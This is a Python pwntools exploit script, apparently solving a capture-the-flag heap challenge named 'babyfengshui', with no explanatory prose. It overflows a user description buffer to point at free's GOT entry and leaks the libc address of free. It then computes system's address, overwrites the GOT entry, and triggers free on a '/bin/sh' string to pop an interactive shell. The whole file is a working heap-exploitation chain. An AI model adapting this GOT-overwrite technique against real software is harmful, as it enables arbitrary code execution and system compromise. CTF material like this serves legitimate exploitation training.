#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-09-25 21:58:11
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
context.log_level = "debug"
p = process("./babyfengshui")
elf = ELF("./babyfengshui")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

def getpid():
	print proc.pidof(p)[0]
	pause()

def AddUser(size, name, text, textLength):
	p.recvuntil("Action: ")
	p.sendline("0")
	p.recvuntil("size of description: ")
	p.sendline(str(size))
	p.recvuntil("name: ")
	p.sendline(name)
	p.recvuntil("text length: ")
	p.sendline(str(textLength))
	p.recvuntil("text: ")
	p.sendline(text)

def DelUser(index):
	p.recvuntil("Action: ")
	p.sendline("1")
	p.recvuntil("index: ")
	p.sendline(str(index))

def DisplayUser(index):
	p.recvuntil("Action: ")
	p.sendline("2")
	p.recvuntil("index: ")
	p.sendline(str(index))

def UpdateDescription(index, textLength, text):
	p.recvuntil("Action: ")
	p.sendline("3")
	p.recvuntil("index: ")
	p.sendline(str(index))
	p.recvuntil("text length: ")
	p.sendline(str(textLength))
	p.recvuntil("text: ")
	p.sendline(text)


free_got = elf.got["free"]

AddUser(0x80, "giantbranch", "Description", 0x80)
AddUser(0x80, "giantbranch", "Description", 0x80)

DelUser(0)

# overwrite Description point
AddUser(0x100, "giantbranch", "/bin/sh\x00" + "A" * 400 + p32(free_got), 0x19d)

#leak free got

DisplayUser(1)

p.recvuntil("description: ")

free_addr = u32(p.recv(4))
print "free_addr = " + hex(free_addr)

# calc
system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])
print "system_addr = " + hex(system_addr)

# overwrite free_got
UpdateDescription(1, 4 , p32(system_addr))

# free -> system("/bin/sh")
DelUser(2)

# getpid()
p.interactive()
